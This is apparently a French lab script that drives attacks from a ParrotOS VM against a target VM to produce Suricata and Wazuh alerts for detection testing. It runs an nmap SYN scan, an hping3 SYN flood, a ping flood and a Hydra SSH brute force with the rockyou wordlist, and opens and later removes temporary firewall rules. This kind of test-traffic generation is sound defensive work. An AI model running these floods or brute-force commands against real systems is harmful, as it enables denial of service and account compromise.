#!/bin/bash
# attack-from-parrot.sh — Lance des attaques depuis ParrotOS vers la Target
# Usage : ./attack-from-parrot.sh <duree_secondes>
# ============================================================
# Execute SUR LE MANAGER.
# ParrotOS (192.168.30.5) envoie du trafic vers la Target (192.168.30.10)
# -> Suricata voit les paquets via af-packet (meme avec UFW)
# -> Wazuh genere des alertes authentiques

DURATION=${1:-300}
PARROT_IP="192.168.30.5"
TARGET_IP="192.168.30.10"
SSH_KEY="$HOME/.ssh/id_ed25519_parrot"

echo "========================================="
echo "  ATTAQUE DEPUIS PARROTOS (${DURATION}s)"
echo "  Cible : $TARGET_IP"
echo "========================================="
echo ""

# --- Phase 1 : Verifier l'acces SSH a ParrotOS ---
echo "[1/5] Verification de l'acces a ParrotOS..."
ssh -o ConnectTimeout=3 -o BatchMode=yes -i "$SSH_KEY" vboxuser@"$PARROT_IP" "hostname" > /dev/null 2>&1
if [ $? -ne 0 ]; then
  echo "[INFO] Pas de cle SSH pour ParrotOS."
  echo ""
  echo "Pour configurer :"
  echo "  1. Sur le Manager :"
  echo "     ssh-keygen -t ed25519 -f $SSH_KEY -N '' -C 'manager->parrot'"
  echo "  2. Sur ParrotOS (depuis sa console) :"
  echo "     mkdir -p ~/.ssh && chmod 700 ~/.ssh"
  echo "     echo '<ta_cle_publique>' >> ~/.ssh/authorized_keys"
  echo "  3. Copier la cle publique :"
  echo "     cat $SSH_KEY.pub"
  echo ""
  echo "[ATTENTION] Je continue sans ParrotOS en utilisant les campagnes Docker locales."
  echo "            Les attaques ne passeront PAS par Suricata."
  echo "            Installe la cle SSH et relance pour des attaques reelles."
  PARROT_SSH=false
else
  echo "[OK] ParrotOS joignable"
  PARROT_SSH=true
fi

# --- Phase 2 : (Optionnel) Regle UFW temporaire sur la Target ---
if [ "$PARROT_SSH" = true ]; then
  echo "[2/5] Ajout regle UFW temporaire pour ParrotOS..."
  ssh target "sudo ufw allow from $PARROT_IP to any port 22 proto tcp comment 'TEMP: ParrotOS attaque' 2>/dev/null"
  ssh target "sudo ufw allow from $PARROT_IP to any port 80 proto tcp comment 'TEMP: ParrotOS HTTP' 2>/dev/null"
  ssh target "sudo ufw allow from $PARROT_IP proto icmp comment 'TEMP: ParrotOS ICMP' 2>/dev/null"
  echo "[OK] Regles temporaires ajoutees"
fi

# --- Phase 3 : Lancer les attaques ---
echo "[3/5] Lancement des attaques..."

if [ "$PARROT_SSH" = true ]; then
  # Attaques depuis ParrotOS
  echo "  -> Nmap scan rapide (10 ports)"
  ssh -i "$SSH_KEY" vboxuser@"$PARROT_IP" "sudo nmap -sS -p 22,80,443,8080,3306,5432,6379,27017,8443,9090 -T4 $TARGET_IP" &
  NMAP_PID=$!
  sleep 10

  echo "  -> Hping3 flood (SYN flood, 10s)"
  ssh -i "$SSH_KEY" vboxuser@"$PARROT_IP" "sudo hping3 -S --flood -p 80 $TARGET_IP -c 500" &
  HPING_PID=$!
  sleep 5

  echo "  -> Ping flood (ICMP)"
  ssh -i "$SSH_KEY" vboxuser@"$PARROT_IP" "ping -f -c 100 $TARGET_IP" &
  PING_PID=$!
  sleep 5

  echo "  -> Hydra bruteforce SSH (30 tentatives)"
  ssh -i "$SSH_KEY" vboxuser@"$PARROT_IP" "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -w 5 $TARGET_IP ssh -o /tmp/hydra_result.txt 2>/dev/null" &
  HYDRA_PID=$!

  echo "[OK] Attaques lancees en parallele"

  # Attendre la duree demandee
  echo "[4/5] Attente de ${DURATION}s pour les attaques..."
  sleep "$DURATION"

  # Nettoyer les processus
  kill $NMAP_PID $HPING_PID $PING_PID $HYDRA_PID 2>/dev/null
  echo "[OK] Attaques terminees"

else
  # Fallback : campagne Docker locale (moins efficace)
  echo "  -> Mode fallback : campagne Docker sur la Target"
  ssh target "cd /home/vboxuser/wazuh-test/traffic-generator && sudo python3 main.py --config config.yaml --duration $DURATION"
  echo "[OK] Campagne Docker terminee"
fi

# --- Phase 4 : Nettoyage UFW ---
if [ "$PARROT_SSH" = true ]; then
  echo "[5/5] Nettoyage des regles UFW temporaires..."
  ssh target "sudo ufw delete allow from $PARROT_IP to any port 22 proto tcp 2>/dev/null"
  ssh target "sudo ufw delete allow from $PARROT_IP to any port 80 proto tcp 2>/dev/null"
  ssh target "sudo ufw delete allow from $PARROT_IP proto icmp 2>/dev/null"
  echo "[OK] Regles temporaires supprimees. ParrotOS de nouveau bloque."
fi

# --- Bilan ---
echo ""
echo "========================================="
echo "  CAMPAGNE TERMINEE"
echo "  Attaques depuis : $([ "$PARROT_SSH" = true ] && echo 'ParrotOS' || echo 'Docker (fallback)')"
echo "  Duree : ${DURATION}s"
echo "  Cible : $TARGET_IP"
echo "========================================="
echo ""
echo "Pour verifier les alertes :"
echo "  - Alertes Suricata : ssh target 'sudo tail -20 /var/log/suricata/fast.log'"
echo "  - Alertes Wazuh : wc -l /var/ossec/logs/alerts/alerts.json"
echo "  - Predictions ML : curl http://127.0.0.1:9090/predictions/recent?limit=10"
